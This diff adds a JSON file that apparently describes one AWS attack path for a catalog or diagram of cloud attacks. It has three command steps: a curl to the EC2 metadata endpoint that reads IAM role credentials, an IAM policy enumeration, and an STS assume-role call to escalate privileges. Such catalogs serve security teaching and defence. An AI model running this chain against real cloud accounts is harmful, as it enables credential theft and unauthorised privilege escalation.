@@ -1,0 +1,48 @@
+{
+    "title": "Exploit EC2 Instance Profile to Assume Higher Privileges",
+    "icon": "https://img.icons8.com/?size=100&id=aHNFVxFPlGgt&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "Get IAM Role Credentials",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/key.png",
+            "details": {
+                "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>",
+                "description": "Retrieves IAM role credentials assigned to the EC2 instance.",
+                "services": ["EC2"],
+                "attack_types": ["Privilege Escalation"],
+                "references": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html"
+            }
+        },
+        {
+            "id": 3,
+            "label": "List Attached Policies",
+            "icon": "https://img.icons8.com/?size=100&id=hcN0JDVRZucI&format=png&color=000000",
+            "details": {
+                "command": "aws iam list-attached-role-policies --role-name <RoleName>",
+                "description": "Lists policies attached to the specified IAM role.",
+                "services": ["IAM"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/iam/list-attached-role-policies.html"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Assume Higher Privileges",
+            "icon": "https://img.icons8.com/?size=100&id=MNxdwy7Nd0B0&format=png&color=000000",
+            "details": {
+                "command": "aws sts assume-role --role-arn <HigherPrivilegeRoleArn> --role-session-name <SessionName>",
+                "description": "Uses the IAM role credentials to assume a role with higher privileges.",
+                "services": ["STS"],
+                "attack_types": ["Privilege Escalation"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role.html"
+            }
+        }
+    ]
+}
